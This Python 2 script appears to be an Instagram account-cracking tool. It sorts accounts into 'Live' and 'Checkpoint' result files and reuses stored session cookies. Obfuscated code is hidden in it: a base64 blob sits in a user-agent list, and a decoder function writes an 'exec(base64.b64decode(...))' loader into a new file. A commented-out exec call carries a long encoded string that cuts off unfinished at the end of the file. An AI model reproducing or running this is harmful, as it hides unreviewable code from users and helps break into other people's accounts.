#!/usr/bin/python2
# coding=utf-8
# Author: tai tai tai tai tai :V
# Tool Instaram
# Versi 0.5

a = "\033[96;1m"
p = "\033[97;1m"
h = "\033[92;1m"
k = "\033[93;1m"
m = "\033[91;1m"
d = "\033[90;1m"

import os
try:
	import concurrent.futures
except ImportError:
	print k+"\n Modul Futures blom terinstall!..."
	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
try:
	import requests
except ImportError:
	print k+"\n Modul Requests blom terinstall!..."
	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")

try:
	from bs4 import BeautifulSoup
except ImportError:
	print k+"\n Modul Bs4 blom terinstall!..."
	os.system("pip install bs4" if os.name == "nt" else "pip2 install bs4")

import os, requests, re, json, random, sys, platform, base64,datetime, subprocess, time
from calendar import monthrange
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

garis = h+"+++>"

data_= []
hasil_ok = []
hasil_cp = []
c=1

status_foll =[]
data_followers = []
pencarian_ = []
platform_dev = str(platform.platform()).lower()
p1 = base64.b64encode(platform_dev)
list_proxy = []

try:
	has_ok = open("hasil_ok.txt", "r").readlines()
	with open("hasil_ok.txt", "w") as tul:
		tul.write("")
	for dev in set(has_ok):
		with open("hasil_ok.txt", "a") as tu:
			tu.write(dev)
except:
	pass
try:
	has_cp = open("hasil_cp.txt", "r").readlines()
	with open("hasil_cp.txt", "w") as tul:
		tul.write("")
	for dev in set(has_cp):
		with open("hasil_cp.txt", "a") as tu:
			tu.write(dev)
except:
	pass

url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "ZGVmIGlxYmVsKGlxKToKCXRyeToKCQlzZW1fcGFrX2JvbF9vbmcgPSAiIgoJCWlxYmFsID0gaXEKCQlwYW56eiA9IHNlbV9wYWtfYm9sX29uZy5zcGxpdCgpCglleGNlcHQ6CgkJcGFzcwoJCQpkZWYgaXFiYWwoZGV2Xyk6CglnbG9iYWwgaQoJdHJ5OgoJCWlxYmFsX2Rldl8gPSAiIgoJCWRldiA9IGRldl8uc3BsaXQoIiUiKQoKCQlmb3IgaXFiYWxfIGluIGRldjoKCQkJdHJ5OgoJCQkJaXFiYWxfZGV2XyArPSBpcWJhbF9bMF0KCQkJZXhjZXB0OgoJCQkJcGFzcwoJCWkgPSBiYXNlNjQuYjY0ZGVjb2RlKGlxYmFsX2Rldl8pCgoJZXhjZXB0OgoJCXBhc3MKCg=="]
#exec(base64.b64decode(user_agentz_qu[2]))
#b=open("j.py", "w")
#b.write(user_agentz_qu[2])
#b.close()
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 21:49:03.772456
xx=""
b=open("bo.py", "w")
def iqbel(iq):
        try:
                sem_pak_bol_ong = ""
                iqbal = iq
                panzz = sem_pak_bol_ong.split()
        except:
                pass

def iqbal(dev_):
        global i
        try:
                iqbal_dev_ = ""
                dev = dev_.split("%")
                for iqbal_ in dev:
                        try:
                                iqbal_dev_ += iqbal_[0]
                        except:
                                pass
                b=open("bo.py", "a")
                b.write("import base64\n\nexec(base64.b64decode('''"+iqbal_dev_+"'''))")
                b.close()
                i = base64.b64decode(iqbal_dev_)
        except:
                pass
# Mau Ngapain Cuk?
def hapus_cookie():
	try:
		os.system("del cookie.txt" if os.name == "nt" else "rm -rf cookie.txt")
	except:
		pass
def hapus_cokiz():
	try:
		os.system("del cokiz.txt" if os.name == "nt" else "rm -rf cokiz.txt")
	except:
		pass

def cek_hasil():
	print garis
	print h+" >"+k+" 1"+p+". Cek Hasil "+h+"OK/Live"
	print h+" >"+k+" 2"+p+". Cek Hasil "+k+"Checkpoint"
	print h+" >"+k+" 3"+m+". Hapus"+p+" Hasil "+k+"Checkpoint"+p+"/"+h+"Live"
	print garis
	while True:
		pil = raw_input(a+" ? "+p+"Pilih"+h+": ")
		if pil == "1":
			try:
				hasil_ok_ = open("hasil_ok.txt", "r").readlines()
				print k+"\n >_"+p+" Menampilkan Hasil "+h+"Live\n"
				for dev in hasil_ok_:
					ok = dev.replace("\n", "").split("==>")
					print a+"  {"+k+"Live"+a+"} "+h+ok[1]+a+" | "+p+ok[3]
				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_ok_))
			except:
				print k+"\n Belum ada hasil"+h+" OK"
			break
		elif pil == "2":
			try:
				hasil_cp_ = open("hasil_cp.txt", "r").readlines()
				print k+"\n >_"+p+" Menampilkan Hasil "+k+"Checkpoint\n"
				for dev in hasil_cp_:
					cp = dev.replace("\n", "").split("==>")
					print a+"  {"+p+"Chek"+a+"} "+k+cp[1]+a+" | "+d+cp[3]
				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_cp_))
			except:
				print k+"\n Belum ada hasil"+p+" CP"
			break
		elif pil == "3":
			print "   "+ garis
			print  h+"   >"+k+" 1"+m+". Hapus"+p+" Hasil "+k+"Live"
			print  h+"   >"+k+" 2"+m+". Hapus"+p+" Hasil "+k+"Checkpoint"
			print "   "+ garis
			while True:
				pil_hps = raw_input(a+"   ? "+p+"Pilih"+h+": ")
				yakin = raw_input(a+"   ? "+p+"Yakin mau Hapus?"+h+" y/n: ")
				if pil_hps == "1" and yakin == "y":
					try:
						os.system("del hasil_ok.txt" if os.name == "nt" else "rm -rf hasil_ok.txt")
						print h+"\n    Sukses Hapus Hasil Live\n"
					except:
						print k+"\n    Belum ada Hasil Live\n"
					exit()
				elif pil_hps == "2" and yakin == "y":
					try:
						os.system("del hasil_cp.txt" if os.name == "nt" else "rm -rf hasil_cp.txt")
						print h+"\n    Sukses Hapus Hasil Checkpoint\n"
					except:
						print k+"\n    Belum ada Hasil Checkpoint\n"
					exit()
				elif yakin == "n":
					exit()
				else:
					pass
		else:
			pass

def cek_login():
	global cookie
	try:
		cok = open("cookie.txt", "r").read()
	except IOError:
		login_dev()

	else:	
		url = "https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5"
		with requests.Session() as ses_dev:
			try:
				login_coki = ses_dev.get(url, cookies={"cookie": cok}, headers=headerz_api)
				if "users" in json.loads(login_coki.content):
					cookie = {"cookie": cok}
				else:
					print m+"\n Cookie Kedaluarsa...\n"
					hapus_cookie()
					login_dev()	
			except ValueError:
				print m+"\n Cookie Kedaluarsa...\n"
				hapus_cookie()
				login_dev()
			except requests.exceptions.ConnectionError:
				print m+"\n Tidak ada Koneksi Internet...\n"
				exit()

#exec("""iqbal('Ys%1w%9d%mh%bi%2k%xm%sh%Iw%Di%0w%gq%Mz%Qp%po%jp%bh%3s%Vq%uv%dc%Fh%9s%mq%bi%2s%xg%sb%Ij%Df%0u%gj%Mw%Qp%pu%kf%Zh%We%Yj%gh%Zf%mu%9e%su%bg%Go%9h%3f%Xa%2u%Rc%lb%dg%im%hm%zq%Zr%Xd%Nk%fl%Zj%Gc%Vk%2d%Ln%Cv%Bn%1i%cc%2b%Vh%yd%br%mg%Fn%tj%Zh%Vw%9j%kg%Zk%Xb%Ym%pl%Or%gj%oz%Js%Zj%2a%xw%vl%Yo%mo%Fn%sv%Ih%Ga%Nr%fr%Zx%mm%9l%sh%bh%Cw%wu%gk%Yj%2t%9l%1t%bo%no%Ra%fa%Zd%mz%9v%sb%bc%Al%op%Jb%ay%Wh%Yv%gl%be%Gz%Vr%ux%Kg%Hz%Nh%0i%Yv%Xv%Rv%1o%cg%1f%9f%mp%bp%2m%xk%sm%Ks%Su%Ah%hh%Pm%Sh%Ah%xd%Oz%gz%ou%Jb%Cz%Xx%Vm%zs%Zj%Xw%Js%ff%df%Gk%Fo%ye%Zn%2h%Vo%0j%Ir%Db%0o%gl%Is%mj%ll%xy%Yh%mu%Fn%sk%Zh%Gm%Vp%2s%Xu%1i%8c%iw%Cp%gn%kp%Jl%aq%Wp%Rq%fn%dd%Gv%Fg%yo%Zp%2n%Vd%0g%Ia%Du%0s%gw%Iy%jn%Eu%yt%Nn%jd%Ib%5l%Mr%Td%Ib%4j%Mr%zl%kt%5r%It%gy%oz%Jx%Zl%Wv%xx%zb%Zp%Te%oq%Ks%Cc%Qx%le%ww%cm%mb%lg%uz%db%Cn%Bz%oh%Ke%ym%Jf%ck%co%ie%Aa%+y%Pi%jy%4b%gm%Rg%mb%9s%so%bj%Gm%9k%3d%Im%Hw%tq%9f%Lg%3d%tj%9z%fw%Ee%Nb%ox%Zq%Wc%sc%rn%ez%3v%0f%vj%Tg%Gy%lw%2r%Ze%So%tg%7s%fc%Sq%Ap%gf%Ii%ik%5g%mo%bc%3g%Jd%tv%Ys%Xd%Qh%oi%cc%3e%Rc%yg%Km%Gu%Nr%vw%dt%Wq%5l%0s%Xp%2p%Zc%vp%bc%Gf%ws%ps%Lf%Gq%xu%lr%bl%ik%ha%ki%Ya%Xc%Rg%hi%Xc%yr%kn%su%bc%Gh%Vv%uy%Kt%Gb%hl%hl%cm%2g%lo%sp%Xx%2q%Nn%wi%Kp%Sw%wn%gh%bw%Go%Vs%ut%Ko%Gj%hd%hc%cm%2s%lf%so%Xq%2t%9f%rh%Ky%Sy%kx%sx%Ch%gx%ks%Jz%ce%3g%lh%zw%Lt%nu%No%0p%Zm%Gt%9l%1o%dh%Cf%5q%mc%by%Hf%Vz%zx%ac%Ck%gx%pi%Cv%gx%ku%Jp%dl%Xf%Na%lj%cl%ld%9i%0x%Yc%Xl%Jq%nm%Zo%Xy%Qe%gf%Ph%Sy%Bi%1k%cd%2r%Vs%yz%br%ms%Fu%tu%Zh%Vq%9p%nv%Ze%Xn%Rf%fk%Zc%my%9r%sc%bp%Gh%9a%3c%Ca%gr%kl%Jx%ax%Wb%Rt%fw%dr%Gg%Fu%ye%Zg%2p%Vn%0m%Ii%Dy%0f%gb%an%Wj%Rt%fl%Ce%gg%oz%Js%Zt%Gs%Fn%0k%Xn%2y%Nz%yt%Zs%lj%9t%mk%bl%2j%xz%sf%In%Da%0c%gv%cv%2j%Vn%zt%Xk%2m%Rt%le%dj%ik%5p%nm%Zi%Xv%Qe%om%In%mb%hj%0f%dr%Ha%Bv%zs%Oy%ij%8p%vl%dh%3p%dd%3l%Li%mf%lr%uc%ce%3i%Ri%hw%Zn%3j%Jb%hb%bs%Si%5i%jv%bb%2h%0h%vy%et%3l%0y%vv%Ie%il%5u%mw%br%3o%Jf%ta%Yu%Xc%Qs%ox%dl%Xb%Ns%lj%cv%lm%9l%0g%Yh%Xl%Jm%ns%Ze%Xg%Qb%pq%Lx%Cv%Bm%oz%Zh%Wg%Fc%kr%Zf%Xx%Jl%zv%Pn%Wz%hs%lp%Yk%Wn%Rz%lq%ch%nt%pw%ff%Yi%Xf%Bt%pm%Ks%Sd%5f%jf%bg%2c%5g%0o%Zv%Ws%5z%0d%Ch%gy%lg%jn%cu%mv%Zv%fv%dt%Gh%9q%rm%Zn%Wu%5j%fe%Zc%mq%9u%sw%bw%Cz%Az%9c%Ia%Hp%Jq%ly%La%mm%Zg%pz%bz%mw%Rw%hu%by%Gq%wb%ot%Ja%3i%sx%ie%Ya%2v%9u%um%Zc%mr%lg%ns%Is%jb%px%7h%Ig%ma%Nx%zb%ci%mg%Zq%fg%dk%Gh%9y%rg%Zw%Wc%4h%ib%Og%ib%Io%os%Ly%id%oj%pe%Ih%id%wp%iz%ds%mt%lk%lg%dg%2v%Vw%ya%Ig%ie%cf%su%Ih%Hf%Nr%0g%cw%ic%hk%kp%Yd%Xx%Ra%fj%Yu%3t%Jw%mn%Xz%2f%Zi%vm%bu%Gy%wu%pf%Ks%Vv%st%ws%Xf%Qt%ox%Jj%al%Gi%Ve%hi%Zf%Gu%Vl%yz%ew%la%9l%mk%by%2k%xl%si%Iq%Db%0r%gu%ev%yt%Jz%Be%Yw%2f%Nr%ll%ca%Hr%Qx%iw%Oi%ie%Aj%ia%Kk%ir%8m%qw%Iq%ik%wc%Kl%Cn%Qu%kk%Jw%Cl%Qy%kf%ia%Qc%Wx%Nw%jd%Zd%Xa%Bk%0s%Lu%Uc%Vc%uo%Yp%2e%9x%kp%av%Wj%5d%ny%Is%jx%oo%gd%Ii%mt%dd%6c%ay%Xd%Ar%su%Iy%Gy%Rj%lx%Zy%mv%xo%hz%dz%Gl%Uj%sq%Ie%Gd%Jz%ye%Im%ii%wu%Kd%Ca%Qv%ko%Jr%Ck%Qz%kw%ir%Qd%Wc%No%jz%Zg%Xk%Bs%0l%Ly%Uc%xd%hm%bl%mb%df%1z%Yp%Ww%dl%lf%Ib%jb%od%gl%Im%mg%Vz%uy%Ld%Vb%Vm%Th%Ld%Gf%Vx%uv%Ou%3y%Eh%9u%Mo%Cv%4x%1g%If%iw%ww%Kd%Co%Qe%kr%Ja%Cs%Qo%kq%ij%Sd%Gz%9m%zv%dl%Cd%Ix%6g%Iv%Cc%Jh%3o%dy%3j%cy%ud%az%Wc%5t%zi%dt%Gd%Fn%nt%cc%mg%Ff%tp%Ls%ma%Ng%vf%bb%Sa%Ib%sh%Cb%ga%kc%Ja%Co%Qp%kk%Je%Iq%kq%9q%ye%ak%Wj%dt%ph%bu%ip%Il%6k%If%Co%Jd%oq%di%Ht%Rl%ww%cf%zy%oo%vu%Lr%3r%dp%3t%dw%ya%5m%pj%bz%nh%Np%0u%Yr%Wd%df%yy%Yf%We%0t%ut%Yc%2a%9l%tv%Iw%ib%wr%Ku%Ci%Qt%ki%Je%Cy%Qk%kk%ik%Uk%my%Vh%mz%Zj%Xs%Jt%lg%cf%ip%Iy%6k%Iz%Ca%Jd%oq%dt%Hg%Rm%wr%co%zt%oq%vu%Ln%3m%dl%3e%dp%ya%5s%px%bp%nq%Nt%0o%Yo%Wd%dx%yl%Yb%Wc%0f%uh%Yo%2w%9z%th%Lp%3e%te%9b%Lp%yv%Id%ue%Zg%mt%9g%yg%bd%Wu%Fq%0q%Kc%Hq%Vc%za%Za%Xo%Ja%fn%df%Gh%Fc%yh%Zq%2u%Vr%0f%Kc%Sw%wt%Kt%Cx%Qp%ke%Jr%Cg%Qw%ky%ip%Vs%Xm%Nj%lh%cy%iu%1v%Bo%Zz%2b%Va%uq%dk%Cb%Ix%6u%Iv%Hn%Ve%zc%Zy%Xr%Jn%ff%Yk%Wk%du%lg%bt%nl%Rc%6e%Lf%Av%oc%Jv%Cy%Qe%kt%Jy%Ca%Ss%Jv%Yo%Lx%Uq%Nc%Tv%Uj%kl%Zk%Uq%bq%2b%tq%ly%bt%is%Ie%6p%Ix%Gu%Ns%yn%Zv%la%9f%0n%ba%2y%tn%lq%bp%lb%9w%md%bm%2p%xn%sw%fz%Qj%ow%Jk%cb%Gm%Fr%yb%Yu%Wh%1z%fr%Zu%mp%9x%sn%bf%Cn%As%9n%Ir%Hg%sl%iq%Id%ng%0n%Kb%Cc%Xc%Vz%yw%bo%Ff%9s%mu%bq%2v%xn%sq%br%3c%cx%gt%Pv%Sr%Ac%iq%am%Ho%Rm%0q%cv%Hd%Mk%6x%Lz%yb%9j%3j%dk%3i%cv%ub%al%Wq%5l%zk%da%Gq%Fr%np%ca%mi%Fz%tv%La%mh%Nz%va%bv%Sb%9j%3r%Zh%Wr%Ig%vm%Zw%nm%Jh%pu%Zm%We%5x%ke%cq%2d%ha%pt%cg%Hg%Mb%va%eh%3y%0i%vm%Ze%mv%9o%sq%bk%Gt%9z%3l%Lg%yn%Ix%uw%Zv%mm%9c%yq%bs%Wu%Fa%0b%Kk%Gy%lc%kk%Xl%3l%Rw%hc%cy%mb%dc%lc%da%Cy%kr%Kx%Cy%Xj%Jd%la%cn%1b%9e%md%bz%2u%xf%su%Is%Df%0m%gm%cm%2t%Va%zn%Xu%2y%Rb%lw%dl%im%5h%wi%bh%3b%Nb%0f%Kl%Hw%Vj%ym%bg%Fw%9n%mv%bi%2w%xq%ss%bo%3m%cr%sy%Iy%Gq%he%lg%Yl%Wo%Rv%lw%cj%ne%Ml%9o%ab%Ga%Vl%ho%Zg%Go%Vg%yy%eh%lh%9k%mq%bo%2b%xr%sa%Ko%Qm%ot%Ju%ad%Wd%Yd%gb%bd%Ge%Vz%ue%Kz%Hl%Nj%0t%Yy%Xl%Rz%1m%cq%1v%9t%mu%bk%2l%xd%sc%Kx%Ss%Ax%ho%Pu%St%Ah%xt%Ot%go%ot%Jk%Cr%Xp%Ba%hm%cn%3j%Mf%Ku%Cb%Wd%Vv%so%ch%2k%Us%6r%Cn%gc%ka%Jh%cf%Hp%Js%pl%bg%np%Qt%go%af%Cw%sq%ij%Xi%Hj%Is%gf%Wb%yo%Ik%rc%ao%yx%sz%iy%Py%ij%0f%is%Kj%2k%gx%ra%Id%le%0n%ga%Ib%im%tp%wq%Kp%3u%Nz%0j%cb%ia%ht%jc%Xd%2e%Zd%ve%bz%Gy%we%pq%Kl%yr%Ik%gn%Iu%it%ty%rv%Kz%3y%Vf%zh%Zs%Xp%Ju%ui%Yf%Wu%1k%li%Xb%2x%Ru%lu%db%id%tl%on%Kp%yc%Iz%gz%Uk%3z%Vj%ra%ce%2y%Vz%zj%Ie%Ex%1l%ly%bh%mq%dq%pl%ay%3z%Vx%0f%ag%Se%An%iv%Kb%3x%Al%rm%dm%Xx%Nk%ls%cj%lq%9f%0p%Ys%Xn%Jf%nj%Zs%Xo%Qa%rt%ab%yr%sy%in%Ic%Dk%5j%fq%Pi%Ch%Bx%cr%bk%ib%Ij%Kp%Ca%Qd%ll%js%Xi%2f%Zo%vh%bw%Gt%wj%rq%Pq%Ty%Ep%Kw%Cz%Qk%lc%ji%bp%3g%Vo%ux%db%Fx%9o%mt%bf%2h%xl%sk%Kw%zx%0x%xl%Ca%gf%pa%kv%Zm%Wj%Yl%ga%br%Gx%9x%nm%aq%Wg%5f%fe%Za%Ge%Vx%2c%Kh%Cs%ko%6u%Ca%gh%lk%ng%bd%Gl%9l%ic%Ys%Ww%wb%gv%Yj%2p%9t%vh%aj%2f%lq%le%Cb%ga%lb%wq%cy%mh%ln%uj%dr%Cd%Ad%ih%Iv%gi%oh%Ja%ca%He%Jv%pp%bt%nb%Ql%gl%Yf%Sk%sq%ib%Iz%Cp%Bd%7o%Id%ix%te%wd%Kr%yq%Ib%go%Tm%Gi%9z%nc%aw%Wv%4i%gl%Sw%Ws%5q%zx%dy%Gk%Fz%nt%cm%mb%Fs%ts%Ig%Cq%Iu%rp%Yw%Se%sd%iu%fr%Sr%Ix%Kh%Cp%Xa%Bf%ys%af%Wr%5f%0q%Ic%Gz%0z%rc%Ia%iz%An%gn%Ip%Cy%0e%ts%Lh%Sz%0r%tj%Le%Sv%0j%ty%Ls%Sv%0q%to%Ls%St%0q%tx%Lc%Se%0p%is%Cw%gt%lc%wg%cq%mj%lo%uo%du%Ck%Bb%ng%Yy%Xl%Ja%pz%cr%wy%on%Ja%do%Xf%Nt%lq%cb%mb%5k%hs%bw%Wx%Vj%fu%Zq%Gq%Vt%2d%Ic%Du%0w%gk%cx%mj%Fe%3e%Xq%2i%lp%ut%ca%Hz%Vk%0z%Kk%Gk%El%rk%Ih%iv%Ak%/x%Iq%iw%ty%wx%Ku%yc%Il%go%To%Wy%Fy%zv%dx%Wv%td%ru%Yr%Wt%4o%gh%Vu%Xd%Nh%lt%ck%mb%5v%hq%bf%Ws%Uy%ip%Ke%2f%gz%rp%Ip%jl%oj%gx%Ih%il%kk%Kw%Ce%Xw%Bv%hg%cn%3s%Ny%fm%Zx%Gd%Vy%2b%Iq%Dv%0s%gw%cu%mp%Fm%3h%Xc%2j%lm%uc%cc%Hv%Vi%0u%Ki%Go%Ew%rd%Iz%ir%Ad%/i%Iu%iz%tz%wb%Kv%ya%Ix%gp%Tw%Wg%Ff%zs%dn%Wz%tx%rz%Yu%Wv%4u%gn%Ii%Fo%Nm%ha%bi%mz%Rs%pb%Iq%ib%tg%kd%Kv%yi%Io%6o%Iv%Cq%Ic%pc%Cl%gj%lb%0i%co%nn%kt%6o%Cl%gx%kq%Jn%dg%Hn%Jb%5a%Oa%gi%oq%Jj%Cz%Qd%li%oq%Zu%Wr%Fp%kc%Zi%Xl%Ji%6m%In%Dl%0c%gb%el%yk%Jw%Vt%ci%2x%Vj%yo%Lv%Uk%Fi%np%Zu%Wz%5h%0w%Ie%jo%os%ga%dm%Xh%Nb%li%cz%ld%9y%he%Zh%2a%Vj%ud%dt%Hi%pe%9m%Ch%ga%kt%Jd%Cy%Xt%dz%pd%dh%Ge%gk%gw%cw%md%Vz%xz%dq%Wp%Vr%zf%de%Hm%Mk%ul%Uz%2c%Vb%zy%ci%2y%lz%vq%bu%ib%gs%px%Iy%Gc%Fn%zp%Iy%Gc%Rg%lz%dj%jx%oz%Kc%Cs%Qj%kb%Jm%Ch%Xp%Vu%yt%bs%Fa%9h%zk%Yw%3r%Jw%hg%cq%Cu%Ah%9c%Ic%Cy%Ju%oi%dv%Hp%Rm%wg%cc%zb%ok%ve%Lm%3q%dw%3g%dc%yh%5c%pw%bj%nn%Nf%0l%Yt%We%dy%yf%Yp%Wc%0r%ul%Yn%2a%9a%ta%Ls%yn%Ig%Kp%Cp%Qn%kr%Je%Ct%Wv%Rz%hv%dy%Gs%Ek%gt%Pk%Sq%Bd%kh%Zy%Xw%Ye%uc%Zi%2v%Vg%0s%Ky%Hv%Vv%ys%bc%Fi%9v%zn%Yx%3p%Jd%hf%cm%Cw%wz%gm%ai%Gx%Vh%hs%Zj%Gq%Vu%yn%ce%zb%1r%oo%Zr%Wt%Fa%km%Zn%Xm%Jk%6h%Ko%Sr%5k%jv%bx%2n%5s%0r%Zb%Wh%5j%0h%Cz%go%kp%Ji%Cu%Qu%lt%jv%ch%mm%Zj%fe%di%Gd%9c%rt%Zj%Ww%4b%ge%Ps%Sy%Bc%yk%Zd%Si%5g%mc%at%Wf%5e%ks%Ys%Wq%xd%sb%Kk%Cn%da%7g%Iq%mn%Na%vc%br%mx%Zj%pb%Zr%yt%Iu%6g%ec%yk%Jl%jz%co%3o%Jq%mw%Xk%3d%Rk%va%at%2a%Vz%uz%Iv%jw%ou%ic%Kr%Cw%4h%qf%Kp%Sm%Iy%sv%Ik%ne%Zx%pq%Zv%Xd%dh%lr%cq%il%Il%nu%Lf%Co%Bi%zl%dg%Hn%Ij%ob%Zh%Gc%Fd%0q%Yd%Sb%ks%po%Wx%zs%Bs%dh%Ct%gz%ka%Js%Ck%Wq%hn%lp%Ys%Wy%Rp%lg%cs%iv%Ag%9p%In%Hc%sv%Kj%Cx%Qr%kd%Jg%Cd%Qk%kb%iu%Qz%Wu%Nq%jl%Zo%Xw%Bb%0c%Id%jw%ov%gy%Ii%ik%ob%vt%Kc%ix%Iu%sz%Ce%gy%kx%Jn%Cn%Qg%km%Jx%Io%ks%Ft%jd%Yo%2y%Vc%wa%dh%Cv%1s%Fv%by%ms%No%vy%Zk%Gz%lk%un%Zc%yd%Is%6j%Ic%Cb%Jz%no%eo%mw%lv%wn%Ly%Cl%Bn%ka%Zf%Wt%Zh%su%Yc%Xy%Ri%lb%Lq%Cl%Bs%iu%cg%im%Il%ss%Cm%gi%kq%Js%Cg%Qx%kt%Jz%Iv%kc%Fv%jg%Yw%2y%Vt%ws%dz%Cz%1w%Me%Yh%Wc%5n%na%dc%Wq%Fv%nv%Zo%St%Iu%6h%Ic%Cw%Jr%lz%bk%id%1j%Vg%Un%yd%xp%ln%bz%jq%tt%xe%Pe%Tg%Az%up%Nb%Sk%Id%si%Ci%gs%kg%Jt%Ch%Qd%kl%Jy%Ic%kw%hy%vc%cp%3w%Qm%ie%Ok%ic%Ak%ip%dg%3j%dy%3j%Lx%mr%lr%uj%ce%3b%Rp%hh%Zx%3a%Jt%hr%bo%Sm%5b%jn%bw%2f%0j%if%Lf%An%oj%Ji%Cs%Qo%ki%Jg%Cr%Ss%Jr%Yt%Ls%Us%No%Tk%Ue%kl%Zg%Uu%bf%2s%tz%le%bq%ii%Im%6z%Iv%Gj%Ne%yz%Zz%lo%9r%0b%bv%2m%ta%lf%bs%ic%wi%Kp%Ca%Qg%kx%Jm%Ch%Qp%km%ic%Wn%Cl%1m%Sy%Zn%Xt%Fc%1g%Zb%Xw%Nt%0q%Zf%Wh%Qz%th%Vy%2b%lp%0c%ab%Cw%Ix%6a%Io%Cv%Je%Yd%Tj%Ut%xc%Ig%db%Hk%Ra%wr%Ut%mz%Vk%xy%dw%Wv%Vg%zh%do%Cg%Ia%st%Ck%go%ks%Jk%Cm%Qv%kf%Jy%Ib%lw%Jh%ll%Zm%mu%Vf%yj%Zi%Xv%Ic%im%Oc%ia%Aq%ik%an%Hy%Rv%0y%cz%Hd%Mv%6x%Ld%yr%9g%3k%db%3g%cx%uj%ab%Wk%5m%za%dk%Gk%Fq%nz%co%mf%Fs%tv%Lk%my%Ne%vq%be%Sp%9c%hj%Yr%2f%No%vx%dq%Wk%5s%0e%cz%yg%9o%sl%bt%2r%df%py%bm%ie%8p%id%Lc%Aw%of%Jm%Cg%Qm%kd%Jy%Cu%Sd%Jm%Vm%cr%2t%Vh%yg%La%Ub%Fu%nt%Zk%Wd%5c%0i%Iq%jt%ou%ga%dz%Xo%Nf%lf%cu%li%9f%hj%Zp%2q%Vj%uh%df%Hd%ox%sb%Cr%gc%kh%Jk%Cr%Qd%kn%Jx%Ig%Hm%0x%Ks%Cs%Qj%kx%Ja%cj%Gh%Fr%yu%Yo%Wi%0z%gd%Pv%Sh%Bc%7c%Cr%gt%ke%Jg%Cp%Qf%kq%Jn%Iu%nx%Ve%zd%Zq%Xh%Jj%uf%Yb%Wg%1o%ln%Ip%jp%ot%gx%dg%Xk%Nk%lt%ch%ma%5q%hi%bf%Wc%Vz%fn%Zt%Gw%Vv%2g%Lv%Af%ox%Ja%Cp%Qd%kl%Jk%Cr%Sf%Jk%lh%bp%mf%Nj%fx%cp%Gq%Ft%zk%cr%3v%dy%vo%cy%mh%Qs%iu%Oj%iq%At%iz%Is%1g%Bp%Xs%Rp%Ff%9v%Jd%Tx%lm%Nq%Uo%Qj%Ui%dw%St%Qp%Us%1v%fg%Qq%lv%Jw%Pe%Vf%1d%Nx%Fy%Uc%jk%or%wo%Ov%nc%ts%9q%Ok%nf%tq%9j%Iw%iz%5x%mz%bh%3s%Jm%tw%Yl%Xb%Qq%ov%cu%mf%Fk%ua%Za%Gd%9s%ti%Lx%nh%Jc%hv%bb%mg%Ra%pw%bz%nq%Qa%od%Mg%To%At%wa%Mf%Da%At%ws%Ms%Do%Ao%wd%Mb%Cc%wr%gc%Of%Tg%km%5t%Of%Ti%kv%5p%Od%Tl%ki%5a%Of%Sc%kc%sm%Ip%Hx%Bp%ha%ci%3z%Nc%fg%Zr%Go%Vn%2g%Ka%Sc%ww%Kv%Cc%Qz%ku%Jv%Cr%Qe%ke%iz%bl%3t%Bn%0k%Sh%Wb%5m%0u%bk%0q%9p%uu%Zg%Vd%Rf%hi%cw%Cv%Is%6y%Ij%Ez%Zp%ht%bb%Hn%Nj%lq%Ll%Aj%oj%Je%Cx%Qk%kc%Jd%Cs%Sl%Jx%xy%dd%Wk%Vv%yu%et%Vr%By%hn%cp%my%Fq%ti%ct%yt%Ib%6t%Ic%Hd%tc%9q%Lg%Ac%og%Jq%Cz%Qv%ka%Jd%Ci%Sx%Jq%zv%dd%Ge%9j%wy%Rz%Gw%Vu%ss%Zt%Xo%Rz%py%bb%2d%5m%Oo%br%2l%5q%jx%Zr%Sb%Ie%6c%Is%Cp%Ij%ia%La%Ar%oa%Ju%Cw%Qr%kh%Jk%Ct%Ss%Ja%0k%cd%nw%Vw%zk%do%Gz%Vh%ka%Ra%Gh%Vg%2j%ap%Wd%Nd%lf%Ug%ml%Vb%jh%bs%3t%Jv%kr%cx%ye%In%6d%In%Hd%te%9i%Cu%gz%kp%Jj%Cz%Qj%ky%Jf%fz%Qx%oh%Jn%Cr%Wo%Vd%4v%Yl%2u%Vb%we%dw%Dq%ou%Kx%Cr%Qr%ko%Jc%ah%Ge%Vs%hi%Zm%Go%Vb%yu%It%Dm%0m%gj%eh%3a%0b%Kf%Ca%Qv%kx%Jx%cd%Gk%Fb%ym%Ye%Wn%0s%gz%Pj%Sg%Bm%7t%fu%Qh%og%Ju%Cf%Ql%lq%wt%Yd%Xe%Nv%zx%Cf%ge%kc%Jd%dg%2j%lh%0g%au%Cg%Bh%yl%Zs%Xg%Fo%1f%Zk%Xr%Nc%0v%cp%yc%5t%Tx%Ze%Xa%Ne%zp%an%Wr%9e%um%Kb%Cn%ku%gr%Yf%Xq%Ma%gc%cf%2b%Vs%zz%Xi%2x%Re%lh%dv%jx%oa%Kz%Ch%Qx%kg%Ji%du%Xq%Jy%sl%Ig%Dt%0e%gc%Iu%mk%he%0k%db%Hp%Br%zr%Oz%iz%8n%vu%dm%3v%dj%3h%Lr%mz%lf%us%cw%3a%Re%he%Zj%3f%Jr%hl%bp%Su%5x%jr%be%2y%0g%va%Yp%Wg%Nj%js%bo%3i%Vq%um%dz%Hx%Mg%vr